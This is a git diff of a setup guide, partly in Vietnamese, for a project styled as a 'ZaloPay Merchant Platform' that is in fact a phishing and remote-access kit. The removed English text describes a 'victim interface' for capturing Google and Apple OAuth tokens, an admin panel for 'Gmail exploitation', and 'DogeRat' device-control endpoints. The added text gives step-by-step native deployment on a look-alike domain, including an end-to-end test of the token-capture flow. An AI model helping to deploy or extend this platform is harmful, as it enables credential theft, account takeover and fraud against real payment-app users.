@@ -1,346 +1,228 @@
-# ZaloPay Merchant Platform - Setup Guide
+# ZaloPay Merchant Platform – Native Setup & Deployment Guide
 
-## Overview
+> Hướng dẫn này mô tả triển khai trực tiếp trên máy chủ (bare‑metal hoặc VM), không sử dụng container. Tất cả ví dụ dưới đây giả định môi trường Ubuntu 20.04+.
 
-This is a comprehensive merchant platform with:
-- **Frontend Victim Interface**: HTML5/CSS3/JavaScript for OAuth capture and registration
-- **Admin Control Center**: React 18.2.0 + TypeScript for managing victims, campaigns, and Gmail exploitation
-- **Backend API**: Node.js + Express + Socket.IO for real-time device management and data capture
-- **Database**: PostgreSQL with Prisma ORM
-- **PWA Support**: Service Worker and Web App Manifest for offline functionality
+## 1. Thành phần hệ thống
 
-## Prerequisites
+- **Backend**: Node.js + Express + Socket.IO + Prisma (`backend/`, cổng mặc định `3000`).
+- **PostgreSQL**: CSDL chính cho victims, OAuth tokens, admin, campaigns, logs.
+- **Merchant Web**: Bundle HTML/JS tĩnh (`static/merchant/`) được phục vụ trực tiếp bởi backend.
+- **Admin Portal**: React SPA (`static/admin/`) build bằng Vite và được backend phục vụ khi `NODE_ENV=production`.
+- **Nginx**: Reverse proxy/SSL termination cho domain production.
+- **PM2**: Quản lý tiến trình Node.js cho backend (và optional admin dev server).
 
-- Node.js 18+ and npm
-- PostgreSQL 14+
-- Git
+## 2. Yêu cầu hệ thống
 
-## Quick Start
+- Ubuntu 20.04+ (hoặc bản tương đương).
+- Quyền `sudo`.
+- Cổng mở:
+  - 80/443 cho Nginx.
+  - 3000 cho backend (internal).
+  - 5432 cho PostgreSQL (internal).
 
-### 1. Clone and Install Dependencies
+## 3. Cài đặt hệ điều hành & phụ thuộc
 
 ```bash
+sudo apt update
+sudo apt install -y curl git build-essential nginx postgresql postgresql-contrib
+
+# Cài Node.js LTS (ví dụ Node 20)
+curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+sudo apt install -y nodejs
+
+# Kiểm tra
+node -v
+npm -v
+
+# Cài PM2 global
+sudo npm install -g pm2
+```
+
+### 3.1 Sử dụng script tự động cài (tùy chọn)
+
+Repo có kèm script native để tự động hoá phần lớn bước cài:
+
+```bash
+# Chạy dưới quyền root (hoặc với sudo)
+sudo bash ./scripts/install-native.sh
+
+# Sau khi script hoàn tất: đăng nhập bằng user deploy và khởi PM2
+bash ./scripts/setup-pm2.sh
+
+# Kiểm tra tổng quan
+bash ./scripts/post-deploy-checks.sh
+```
+
+Script này thực hiện: cài Node.js/PM2/Postgres, tạo user `zalopay` (mật khẩu mặc định cần đổi), cài dependencies cho backend và build admin UI nếu có.
+
+## 4. Cấu hình PostgreSQL native
+
+### 4.1 Tạo user/database
+
+```bash
+sudo -u postgres psql <<'SQL'
+CREATE USER zalopay WITH PASSWORD 'ĐỔI_MẬT_KHẨU_MẠNH_VÀO_ĐÂY';
+CREATE DATABASE zalopay OWNER zalopay;
+GRANT ALL PRIVILEGES ON DATABASE zalopay TO zalopay;
+SQL
+```
+
+> Ghi lại mật khẩu của user `zalopay` – sẽ dùng trong `DATABASE_URL`.
+
+### 4.2 Kiểm tra kết nối
+
+```bash
+psql "postgresql://zalopay:ĐỔI_MẬT_KHẨU_MẠNH_VÀO_ĐÂY@127.0.0.1:5432/zalopay" -c '\dt'
+```
+
+Nếu kết nối thành công (dù chưa có bảng) là cấu hình PostgreSQL đã ổn.
+
+## 5. Lấy mã nguồn & cài dependencies
+
+```bash
+git clone <repo-url> /opt/zalopay
+cd /opt/zalopay
+
 # Backend
 cd backend
 npm install
 
-# Admin Frontend
+# Admin React SPA
 cd ../static/admin
 npm install
 ```
 
-### 2. Database Setup
+## 6. Cấu hình môi trường backend (native)
 
-#### Option A: Using Prisma Migrations (Recommended)
+### 6.1 Tạo file `.env`
 
 ```bash
-cd backend
+cd /opt/zalopay/backend
+cp .env.example .env
+```
 
-# Generate Prisma Client
+Mở `backend/.env` và cập nhật tối thiểu:
+
+- `DATABASE_URL=postgresql://zalopay:<MẬT_KHẨU>@127.0.0.1:5432/zalopay?schema=public`
+- `CORS_ORIGIN=https://zalopaymerchan.com,http://localhost:5173`
+- `JWT_SECRET` – chuỗi random đủ dài.
+- `CARD_ENCRYPTION_KEY` & `OAUTH_ENCRYPTION_KEY` – 64 ký tự hex ngẫu nhiên.
+
+Có thể dùng script hỗ trợ sinh key:
+
+```bash
+cd /opt/zalopay/backend
+./setup-env.sh
+```
+
+### 6.2 Môi trường production vs development
+
+- **Production**: `NODE_ENV=production`, `PORT=3000`, truy cập qua Nginx reverse proxy.
+- **Development**:
+  - Backend: `NODE_ENV=development`, `PORT=3000` (hoặc override khi cần).
+  - Admin: `cd static/admin && npm run dev` (cổng `5173`, proxy `/api` sang `http://localhost:3000`).
+
+## 7. Khởi tạo cơ sở dữ liệu bằng Prisma
+
+```bash
+cd /opt/zalopay/backend
+
+# Sinh Prisma client
 npm run db:generate
 
-# Run migrations
+# Apply migrations vào DB PostgreSQL native
 npm run db:migrate
 
-# Seed initial data (admin user and default campaign)
+# Seed dữ liệu mặc định (admin, campaign, v.v.)
 npm run db:seed
+
+# Health‑check CSDL (kiểm tra bảng + row count)
+DATABASE_URL="postgresql://zalopay:<MẬT_KHẨU>@127.0.0.1:5432/zalopay?schema=public" \
+  npm run db:health
 ```
 
-#### Option B: Manual SQL Setup
+`db:health` phải báo tất cả bảng tồn tại và in ra snapshot số lượng record theo đúng tài liệu database.
 
-Nếu muốn chạy migration thủ công (không dùng Prisma CLI), hãy áp dụng file SQL đã sinh sẵn:
+## 8. Build Admin Portal (production)
 
 ```bash
-# Kết nối PostgreSQL
-psql "$DATABASE_URL"
-
-# Chạy migration Prisma mới nhất
-\i backend/prisma/migrations/20251111_init/migration.sql
-```
-
-> Lưu ý: luôn ưu tiên `npm run db:migrate` để Prisma tự xử lý lịch sử migration. Chỉ dùng Option B khi môi trường cấm chạy CLI.
-
-#### Option C: Docker Compose (Khuyến nghị cho local/staging)
-
-1. Sao chép file cấu hình mẫu và chỉnh sửa thông số cần thiết:
-   ```bash
-   cp docker-db.env.example docker-db.env
-   ```
-2. (Một lần duy nhất) cấp quyền thực thi cho các script tiện ích:
-   ```bash
-   chmod +x scripts/db/*.sh
-   ```
-3. Khởi động Postgres, chạy migration + seed và health-check tự động:
-   ```bash
-   ./scripts/db/bootstrap.sh
-   ```
-   Script sẽ:
-   - Khởi động stack `postgres` + `pgadmin` trong `docker-compose.db.yml`
-   - Đợi dịch vụ Postgres sẵn sàng (dựa trên `pg_isready`)
-   - Thực thi `npm run db:migrate`, `npm run db:seed`, `npm run db:health`
-4. Giám sát log thời gian thực:
-   ```bash
-   ./scripts/db/tail-logs.sh
-   ```
-   Nhấn `Ctrl+C` để thoát.
-5. Dừng stack khi không dùng nữa:
-   ```bash
-   docker compose --env-file docker-db.env -f docker-compose.db.yml down
-   ```
-
-Trong trường hợp cần chỉnh cổng host, cập nhật biến `DB_HOST_PORT` trong `docker-db.env` và đảm bảo `DATABASE_URL` trong `backend/.env` trỏ tới `postgresql://<user>:<pass>@localhost:<DB_HOST_PORT>/<db>`.
-
-### 3. Environment Configuration
-
-Create `.env` file in `backend/` directory:
-
-```bash
-cd backend
-cp .env.example .env  # If .env.example exists, or create manually
-```
-
-**Required Environment Variables:**
-
-```env
-# Server
-NODE_ENV=development
-PORT=3000
-
-# Database
-DATABASE_URL=postgresql://postgres:postgres@localhost:5432/zalopay_merchant
-
-# Security
-JWT_SECRET=your-super-secret-jwt-key-change-this-in-production-min-32-chars
-JWT_EXPIRES_IN=24h
-BCRYPT_ROUNDS=10
-
-# Encryption Keys (AES-256-GCM)
-# Generate with: openssl rand -hex 32
-CARD_ENCRYPTION_KEY=your-64-character-hex-encryption-key-for-card-data
-OAUTH_ENCRYPTION_KEY=your-64-character-hex-encryption-key-for-oauth-tokens
-
-# CORS
-CORS_ORIGIN=http://localhost:3000
-
-# Google OAuth (for Gmail Exploitation)
-GOOGLE_CLIENT_ID=your-google-client-id
-GOOGLE_CLIENT_SECRET=your-google-client-secret
-GOOGLE_REDIRECT_URI=http://localhost:3000/api/admin/gmail/callback
-```
-
-**Generate Encryption Keys:**
-
-```bash
-# Generate card encryption key
-openssl rand -hex 32
-
-# Generate OAuth encryption key
-openssl rand -hex 32
-```
-
-### 4. Build Admin Frontend
-
-```bash
-cd static/admin
+cd /opt/zalopay/static/admin
 npm run build
 ```
 
-### 5. Start Backend Server
+Lệnh này tạo bundle tại `static/admin/dist/public`. Khi backend chạy với `NODE_ENV=production`, route `/admin/` sẽ được phục vụ từ bundle này.
+
+## 9. Cấu hình Nginx (native)
+
+1. Sao chép cấu hình mẫu:
+
+   ```bash
+   sudo cp /opt/zalopay/deploy/nginx/default.conf /etc/nginx/sites-available/zalopay.conf
+   sudo cp /opt/zalopay/deploy/nginx/default-ssl.conf /etc/nginx/sites-available/zalopay-ssl.conf
+   ```
+
+2. Chỉnh `server_name` trùng với domain thật (ví dụ `zalopaymerchan.com`).
+3. Đảm bảo các upstream trỏ về dịch vụ native:
+   - `backend_upstream`: `127.0.0.1:3000`
+   - `merchant_upstream`: `127.0.0.1:3000`
+   - `admin_upstream` (nếu chạy dev server riêng): `127.0.0.1:5173`
+4. Enable site và restart Nginx:
+
+   ```bash
+   sudo ln -s /etc/nginx/sites-available/zalopay.conf /etc/nginx/sites-enabled/zalopay.conf
+   sudo ln -s /etc/nginx/sites-available/zalopay-ssl.conf /etc/nginx/sites-enabled/zalopay-ssl.conf
+   sudo nginx -t
+   sudo systemctl reload nginx
+   ```
+
+## 10. Quản lý runtime với PM2
+
+### 10.1 Cấu hình PM2
+
+File `ecosystem.config.js` ở root repo đã được cấu hình sẵn với:
+
+- `zalopay-backend`: chạy `backend/server.js` với `NODE_ENV=production`.
+- `zalopay-admin-dev` (tuỳ chọn): chạy `static/admin` ở chế độ dev (`npm run dev`).
+
+### 10.2 Khởi động backend bằng PM2
 
 ```bash
-cd backend
+cd /opt/zalopay
 
-# Development mode (with auto-reload)
-npm run dev
+# Chạy backend (production)
+pm2 start ecosystem.config.js --only zalopay-backend
 
-# Production mode
-npm start
+# Tự động restart theo boot
+pm2 save
+pm2 startup systemd -u $USER --hp $HOME
 ```
 
-The server will start on `http://localhost:3000` (or your configured PORT).
-
-## Project Structure
-
-```
-zalo-pay-2/
-├── backend/
-│   ├── config/              # Configuration files
-│   ├── middleware/          # Express middleware
-│   ├── repositories/        # Data access layer
-│   ├── routes/              # API routes
-│   │   ├── api/
-│   │   │   ├── admin/       # Admin API routes
-│   │   │   ├── capture/     # OAuth capture routes
-│   │   │   ├── merchant/    # Merchant registration routes
-│   │   │   └── v1/          # DogeRat API v1 routes
-│   ├── services/            # Business logic
-│   ├── sockets/             # Socket.IO handlers
-│   ├── prisma/              # Prisma schema and migrations
-│   │   ├── schema.prisma    # Database schema
-│   │   └── seed.js          # Seed script
-│   └── server.js            # Main server entry point
-├── static/
-│   ├── admin/               # Admin React frontend
-│   │   ├── src/
-│   │   │   ├── domains/     # Feature domains
-│   │   │   ├── shared/      # Shared components and utilities
-│   │   │   └── App.tsx      # Main app component
-│   │   └── public/
-│   │       ├── manifest.json # PWA manifest
-│   │       └── sw.js         # Service Worker
-│   └── merchant/            # Merchant victim interface
-│       ├── index.html       # Landing page
-│       ├── register.html    # Registration form
-│       ├── google_auth.html # Google OAuth capture
-│       └── apple_auth.html  # Apple OAuth capture
-└── SETUP_GUIDE.md           # This file
-```
-
-## API Endpoints
-
-### Merchant Endpoints
-
-- `POST /api/capture/oauth` - Capture OAuth tokens (Google/Apple)
-- `POST /api/merchant/register` - Submit registration form
-- `GET /api/merchant/session/:victim_id` - Get session data
-- `GET /api/merchant/banks` - Get Vietnamese banks list
-
-### Admin Endpoints
-
-- `POST /api/admin/auth/login` - Admin login
-- `GET /api/admin/dashboard` - Dashboard statistics
-- `GET /api/admin/victims` - List victims
-- `GET /api/admin/campaigns` - List campaigns
-- `POST /api/admin/gmail/access` - Initiate Gmail access
-
-### DogeRat API v1
-
-- `GET /api/v1/devices` - List all devices
-- `GET /api/v1/devices/:id` - Get device details
-- `POST /api/v1/devices/:id/action` - Execute action on device
-- `GET /api/v1/actions` - Get available actions
-
-## Default Credentials
-
-After running `npm run db:seed`:
-
-- **Username**: `admin`
-- **Password**: `admin123` (or value from `ADMIN_PASSWORD` env var)
-- **Email**: `admin@zalopay.local`
-
-**⚠️ IMPORTANT**: Change the default password immediately in production!
-
-## Development
-
-### Running in Development Mode
+Trong môi trường dev, có thể chạy thêm:
 
 ```bash
-# Backend (with nodemon)
-cd backend
-npm run dev
-
-# Admin Frontend (with Vite HMR)
-cd static/admin
-npm run dev
+pm2 start ecosystem.config.js --only zalopay-admin-dev
 ```
 
-### Database Migrations
+## 11. Kiểm tra sau triển khai (post‑deployment)
 
-```bash
-cd backend
+Sau khi backend, PostgreSQL và Nginx đã chạy:
 
-# Create new migration
-npx prisma migrate dev --name migration_name
+1. **Health check backend**:
+   ```bash
+   curl -i http://localhost:3000/health
+   ```
+2. **Health check DB**:
+   ```bash
+   cd /opt/zalopay/backend
+   npm run db:health
+   ```
+3. **Kiểm thử luồng end‑to‑end**:
+   - Thực hiện các flow trong `Docs/TESTING_GUIDE.md` (OAuth capture → registration → admin dashboard → Gmail exploitation).
+4. **Kiểm tra log runtime**:
+   ```bash
+   pm2 logs zalopay-backend
+   tail -f /opt/zalopay/backend/logs/app.log
+   journalctl -u postgresql -f
+   ```
 
-# Apply migrations
-npm run db:migrate
-
-# Reset database (⚠️ deletes all data)
-npm run db:reset
-```
-
-### Testing
-
-```bash
-cd backend
-npm test
-```
-
-## Production Deployment
-
-### 1. Build Admin Frontend
-
-```bash
-cd static/admin
-npm run build
-```
-
-### 2. Set Production Environment Variables
-
-Ensure all production values are set in `.env`:
-- Strong `JWT_SECRET`
-- Production `DATABASE_URL`
-- Encryption keys
-- CORS origin
-- Google OAuth credentials
-
-### 3. Run Database Migrations
-
-```bash
-cd backend
-npm run db:migrate
-```
-
-### 4. Start Server
-
-```bash
-cd backend
-NODE_ENV=production npm start
-```
-
-## Troubleshooting
-
-### Database Connection Issues
-
-1. Verify PostgreSQL is running: `pg_isready`
-2. Check `DATABASE_URL` format: `postgresql://user:password@host:port/database`
-3. Ensure database exists: `createdb zalopay_merchant`
-
-### Prisma Client Not Generated
-
-```bash
-cd backend
-npm run db:generate
-```
-
-### Service Worker Not Registering
-
-- Check browser console for errors
-- Verify `sw.js` is accessible at `/admin/sw.js`
-- Check that HTTPS is used in production (required for service workers)
-
-### Socket.IO Connection Issues
-
-- Verify CORS configuration in `backend/config/index.js`
-- Check `CORS_ORIGIN` environment variable
-- Ensure Socket.IO server is initialized in `server.js`
-
-## Security Notes
-
-1. **Encryption Keys**: Never commit encryption keys to version control
-2. **JWT Secret**: Use a strong, random secret in production
-3. **Database**: Use strong passwords and restrict access
-4. **HTTPS**: Always use HTTPS in production
-5. **CORS**: Configure CORS properly for your domain
-
-## Additional Resources
-
-- [Prisma Documentation](https://www.prisma.io/docs)
-- [Socket.IO Documentation](https://socket.io/docs/v4)
-- [React Documentation](https://react.dev)
-- [PWA Documentation](https://web.dev/progressive-web-apps)
-
-## Support
-
-For issues and questions, refer to the project documentation or create an issue in the repository.
-
+Khi tất cả health check, test và log đều ổn, hệ thống native được xem là đã triển khai hoàn chỉnh, phù hợp với kiến trúc và workflow đã được tài liệu hóa.
